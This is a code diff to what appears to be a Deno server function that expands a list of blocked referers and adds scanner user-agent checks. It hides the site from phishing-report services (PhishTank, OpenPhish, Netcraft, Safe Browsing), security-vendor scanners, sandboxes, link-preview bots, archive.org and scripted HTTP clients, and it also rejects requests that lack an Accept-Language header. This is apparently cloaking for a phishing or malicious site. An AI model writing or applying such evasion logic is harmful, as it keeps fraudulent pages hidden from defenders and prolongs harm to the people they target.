@@ -25,12 +25,95 @@ let cache: Cache | null = null;
 
 const REFERER_BLACKLIST = [
   "phishtank.com",
+  "phishtank.org",
+  "openphish.com",
   "namecheap.com",
   "virustotal.com",
   "urlscan.io",
+  "urlquery.net",
+  "urlvoid.com",
+  "sucuri.net",
+  "sitecheck.sucuri.net",
+  "fortinet.com",
+  "fortiguard.com",
+  "trendmicro.com",
+  "sitesafety.trendmicro.com",
+  "sophos.com",
+  "bitdefender.com",
+  "quttera.com",
+  "eset.com",
+  "kaspersky.com",
+  "opswat.com",
+  "metadefender.com",
+  "hybrid-analysis.com",
+  "joesandbox.com",
+  "any.run",
+  "ipqualityscore.com",
+  "abuse.ch",
+  "phishcheck.me",
+  "netcraft.com",
+  "report.netcraft.com",
+  "scanurl.net",
+  "isitphishing.org",
+  "checkphish.ai",
+  "threatbook.io",
+  "webinspector.com",
+  "browserling.com",
+  "browserstack.com",
+  "saucelabs.com",
+  "archive.org",
+  "web.archive.org",
+  "cachedview.com",
   "google.com/safebrowsing",
   "safebrowsing.google.com",
   "transparencyreport.google.com",
+];
+
+const SCANNER_UA_MARKERS = [
+  "urlscan",
+  "sucuri",
+  "fortinet",
+  "trendmicro",
+  "sophos",
+  "bitdefender",
+  "kaspersky",
+  "eset",
+  "netcraft",
+  "phishtank",
+  "openphish",
+  "safebrowsing",
+  "googlebot-safety",
+  "smartscreen",
+  "msnbot-media",
+  "bingpreview",
+  "slackbot",
+  "twitterbot",
+  "discordbot",
+  "telegrambot",
+  "whatsapp",
+  "facebookexternalhit",
+  "linkedinbot",
+  "skypeuripreview",
+  "pinterest",
+  "applebot",
+  "duckduckbot",
+  "yandex",
+  "baiduspider",
+  "mj12bot",
+  "ahrefsbot",
+  "semrushbot",
+  "dotbot",
+  "rogerbot",
+  "screaming frog",
+  "python-requests",
+  "curl/",
+  "wget",
+  "go-http-client",
+  "java/",
+  "okhttp",
+  "aiohttp",
+  "node-fetch",
+  "axios",
 ];
 
 const HEADLESS_MARKERS = [
@@ -47,6 +130,7 @@ const HEADLESS_MARKERS = [
 const IP_SOURCES = [
   "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level1.netset",
   "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_webclient.netset",
+  "https://raw.githubusercontent.com/lord-alfred/ipranges/main/all/ipv4.txt",
 ];
 const TOR_SOURCE = "https://check.torproject.org/torbulkexitlist";
 const UA_SOURCE =
@@ -164,6 +248,7 @@ Deno.serve(async (req) => {
     const path: string = (body?.path || "").toString().slice(0, 500);
     const ua: string = (req.headers.get("user-agent") || "").toLowerCase();
     const referer = req.headers.get("referer") || "";
+    const acceptLanguage = req.headers.get("accept-language") || "";
     const ip = extractIp(req);
 
     const lists = await getCache();
@@ -177,6 +262,24 @@ Deno.serve(async (req) => {
         break;
       }
     }
+
+    // 1b) Scanner / crawler UA markers
+    if (!reason && ua) {
+      for (const m of SCANNER_UA_MARKERS) {
+        if (ua.includes(m)) {
+          reason = `scanner_ua:${m}`;
+          break;
+        }
+      }
+    }
+
+    // 1c) Missing accept-language (real browsers always send it)
+    if (!reason && !acceptLanguage) {
+      reason = "missing_accept_language";
+    }
+
+
+
 
     // 2) Referer blacklist
     if (!reason && referer) {
